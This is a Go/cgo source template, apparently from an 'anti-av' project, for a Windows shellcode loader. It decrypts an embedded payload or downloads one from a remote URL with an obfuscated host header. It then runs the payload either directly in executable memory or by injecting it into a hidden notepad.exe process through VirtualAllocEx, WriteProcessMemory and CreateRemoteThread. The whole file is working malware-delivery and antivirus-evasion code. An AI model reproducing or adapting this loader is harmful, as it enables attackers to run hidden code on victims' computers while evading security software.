package main

/*
#cgo windows CFLAGS: -DWIN=1

#include <stdio.h>

#if defined(WIN)
#include <Windows.h>
#include <tchar.h>
#endif

#define {{.HACK}} 1

#ifdef NORMAL
void sc(unsigned char *c, int c_len) {
#if defined(WIN)
	printf("[+] Alloc Code Memory\n");
	void *exec = VirtualAlloc(0, c_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, c, c_len);
	printf("[+] Call Code\n");
	((void(*)())exec)();
#else
	printf("hello world!");
#endif
}
#elif INJECT
void sc(unsigned char *c, int c_len) {
#if defined(WIN)
	PROCESS_INFORMATION stProcessInfo = {0};
	STARTUPINFO stStartUpInfo = {0};
	stStartUpInfo.cb = sizeof(stStartUpInfo);

	stStartUpInfo.dwFlags |= STARTF_USESHOWWINDOW;
	stStartUpInfo.wShowWindow = SW_HIDE;
	if (!CreateProcess(NULL,_T("notepad.exe"),NULL,NULL, 0, 0, NULL, NULL, &stStartUpInfo, &stProcessInfo)) {
		printf("[-] Create Process Failed");
		return;
	}
	HANDLE hProc= OpenProcess(0x1F0FFF, 0, stProcessInfo.dwProcessId);
	if (hProc == 0) {
		printf("[-] OpenProcess Failed");
		return;
	}
	LPVOID rMem = (PTSTR)VirtualAllocEx(hProc, NULL, c_len, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (rMem == NULL) {
        CloseHandle(hProc);
  		printf("[-] Create Memory Failed");
		return;
 	}
	if (!WriteProcessMemory(hProc, rMem, c, c_len, NULL)) {
		CloseHandle(hProc);
  		printf("[-] Write Memory Failed");
		return;
	}

	if (CreateRemoteThread(hProc, NULL, 0,(LPTHREAD_START_ROUTINE) rMem,NULL,0, NULL) == NULL) {
  		printf("[-] Call Code Failed");
	}
	CloseHandle(hProc);
#else
	printf("hello world!");
#endif
}
#else
#error "Not Support HACK"
#endif 

*/
import "C"
import (
	"bytes"
	"fmt"
	"os"
	"unsafe"

	"github.com/b1gcat/anti-av/utils"
)

var (
	Code = []byte{ {{.CODE}} }
)

func SC() {
	payload()
	C.sc((*C.uchar)(unsafe.Pointer(&Code[0])), C.int(len(Code)))
}

func payload() {
	if bytes.HasPrefix(Code, []byte{0x0, 0x0, 0x0, 0x0}) {
		url, err := utils.DeCrypt(Code)
		if err != nil {
			fmt.Println("[x] ", err.Error())
			os.Exit(0)
		}
		payload, err := utils.HttpGet(string(url), "{{.HOST_OBFUSCATOR}}")
		if err != nil {
			fmt.Println("[-] ", err.Error())
			os.Exit(0)
		}
		Code = payload
	}
	payload, err := utils.DeCrypt(Code)
	if err != nil {
		fmt.Println("[-] ", err.Error())
		os.Exit(0)
	}

	Code = payload
}
